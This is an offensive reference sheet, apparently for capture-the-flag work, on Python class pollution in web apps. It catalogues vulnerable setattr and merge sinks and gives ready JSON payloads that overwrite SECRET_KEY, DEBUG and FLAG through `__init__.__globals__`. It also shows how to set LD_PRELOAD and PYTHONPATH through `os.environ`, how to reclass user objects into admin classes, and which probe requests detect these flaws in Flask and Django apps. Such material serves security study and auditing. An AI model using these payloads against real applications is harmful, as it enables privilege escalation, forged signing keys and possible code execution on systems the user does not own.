# Python class pollution — the attribute-path atlas

`__proto__` has no Python twin — the shared root is a CLASS, a
module's `__globals__`, or `builtins`. The write primitive is a
`setattr`-loop or a `__dict__.update` that reaches those roots.

---

## 1. The object graph you walk

```python
obj.__class__                 # the class — shared across instances
obj.__class__.__mro__         # the MRO — base classes
obj.__class__.__bases__       # direct bases
obj.__class__.__dict__        # the class namespace — WRITABLE
obj.__class__.__qualname__    # name
obj.__init__                  # the constructor — a function
obj.__init__.__globals__      # the MODULE globals — the prize
func.__globals__              # any function's module globals
func.__globals__['os']        # the module's os import
type(obj)                     # same as __class__
vars(obj)                     # obj.__dict__
getattr(obj, k)               # read
setattr(obj, k, v)            # write — the sink primitive
```

## 2. The write sinks in app code

```python
# pattern 1 — the setattr loop
for k, v in request.json.items():
    setattr(obj, k, v)
setattr(obj, "__class__", Evil)          # reclass!
setattr(obj, "__dict__", {...})          # swap the namespace

# pattern 2 — the dict update
obj.__dict__.update(request.json)
config.__dict__.update(payload)
vars(obj).update(payload)

# pattern 3 — the path setter
def set_path(o, path, val):
    for p in path.split(".")[:-1]:
        o = getattr(o, p)
    setattr(o, path.split(".")[-1], val)
set_path(obj, "__class__.attr", v)
set_path(obj, "__init__.__globals__.SECRET", "x")

# pattern 4 — the config merge
def merge(d, s):
    for k, v in s.items():
        if isinstance(v, dict):
            merge(getattr(d, k), v)      # getattr on magic attrs!
        else:
            setattr(d, k, v)
# {"__class__":{"x":1}} → merge(getattr(d,"__class__"),{"x":1})
# → setattr on the CLASS itself — class pollution
```

Pattern 4 is the purest Python analog of `_.merge` — `getattr(d, k)`
on `k="__class__"` returns the class object, and `setattr(class, k2,
v)` writes to the class — every instance inherits it.

## 3. The readback oracles

```python
# after writing via the sink, confirm on a fresh instance
NewObj().attr            # does the class write propagate?
importlib.reload(mod)    # does the module-global write survive?
```

## 4. `__globals__` — the module-level write

`func.__globals__` is the dict of the module where the function was
defined. Writing there changes what the module's code sees on the
NEXT call:

```python
setattr_target = obj.__init__.__globals__
# if a setter takes a dotted path:
{"path": "__init__.__globals__.SECRET_KEY", "value": "x"}
{"path": "__init__.__globals__.DEBUG", "value": true}
{"path": "__init__.__globals__.FLAG", "value": "x"}
# or via a nested JSON dict-merge reaching a function's globals
{"a": {"__init__": {"__globals__": {"x": 1}}}}
```

What lives in `__globals__`: imported modules (`os`, `sys`), module-
level config (`SECRET_KEY`, `DB_URL`, `DEBUG`, `FLAG`), other
functions, `__builtins__`/`__loader__`/`__spec__`/`__name__`.

## 5. `os.environ` — env pollution from a path setter

```json
{"path": "__init__.__globals__.os.environ.FLAG_READ", "value": "1"}
{"path": "__globals__.os.environ.PYTHONPATH", "value": "/tmp"}
{"path": "__init__.__globals__.os.environ.LD_PRELOAD", "value": "/tmp/x.so"}
```

If the app's config reads env lazily (`os.environ.get("X", default)`),
polluting `os.environ` works like `NODE_OPTIONS` in Node.

## 6. `__builtins__` and the shadow-write

```python
obj.__init__.__globals__["__builtins__"]
# the builtins dict — writing a name shadows it for the module
{"path": "__init__.__globals__.__builtins__.print", ...}
{"path": "__init__.__globals__.__builtins__.open", ...}
# rarely what you want — the payoff is usually SECRET_KEY/DEBUG
```

## 7. Class attribute writes that pay

| Polluted attr | The fallback read |
|---|---|
| `is_admin` | `if self.is_admin` on a fresh instance |
| `role` | `self.role == 'admin'` |
| `level` | permission checks |
| `debug` | `if config.debug` |
| `verified` | `self.verified` |
| `SECRET_KEY` (globals) | JWT/signing on next call |
| `DEBUG` (globals) | error verbosity, template reload |
| `FLAG` (globals) | direct readback |
| `app.config['X']` | a config dict — `setattr` on dict fails; needs `__setitem__` path |
| `db.engine` | connection-level writes |
| `logging.level` | log verbosity |

## 8. `__class__` reclassing — the dangerous write

`setattr(obj, "__class__", SomeOtherClass)` — reclass an existing
instance. If a path setter or setattr-loop lets you write `__class__`
itself, the object instantly gains the other class's methods and
defaults:

```python
setattr(user, "__class__", AdminUser)   # user now IS an AdminUser
setattr(sess, "__class__", RootSession)
```

The target class must share `__slots__`/instance layout with the
source in CPython (no-layout classes mostly reclass fine). In CTF
this is often the intended path — a `setattr(obj, k, v)` loop that
doesn't filter magic names.

## 9. `__dict__.update` vs `setattr` — what each accepts

```python
obj.__dict__.update({"__class__": X})   # puts a KEY in __dict__, no reclass
setattr(obj, "__class__", X)            # the real reclass
obj.__dict__ = {...}                    # namespace swap — needs __dict__ writable
```

`__dict__.update` cannot trigger `__class__` reclassing — the key
just sits in the instance dict. `setattr` triggers the descriptor
protocol — `__class__` assignment goes through `type` machinery.

## 10. The Flask/Django specifics

```python
# Flask — the config object is a dict, not attrs
app.config.update(request.json)              # dict update — no proto
app.config.update(SECRET_KEY='x')            # via kwargs
# the Jinja env is the real target:
app.jinja_env.globals.update(...)            # template globals
app.jinja_env.filters.update(...)
# the sink: a template reading a polluted global/filter

# Django — settings is a module attr read
from django.conf import settings
settings.DEBUG                                # lazy-read each access?
# settings.configure / setattr on module — process-global
setattr(settings, 'ALLOWED_HOSTS', ['*'])
```

The `os.environ` write is the more reliable Django/Flask payoff —
`settings` values sourced from env get re-read on lazy access.

## 11. Detection — does a `setattr`-loop exist?

```bash
# black-box: send a magic-name key and watch for class-write behavior
POST {"__class__": {"x": 1}}            # merge-into-class attempt
POST {"__dict__": {"x": 1}}             # namespace swap attempt
POST {"field": "__class__.x", "value": 1}   # path-API
POST {"field": "__init__.__globals__.SECRET", "value": "x"}
# readback: hit an endpoint that returns the object's attrs,
# or a fresh instance's defaults — does 'x' appear?
```

## 12. The ledger

```bash
python3 tools/state.py <chal> --hypothesis "python class pollution via setattr loop"
# refutes when: setattr filters magic names; or write is dict-update
# only (no __class__ reclass); or the path-setter splits on '.' but
# getattr on '__class__' is blocked; or no class attr is ever read
```
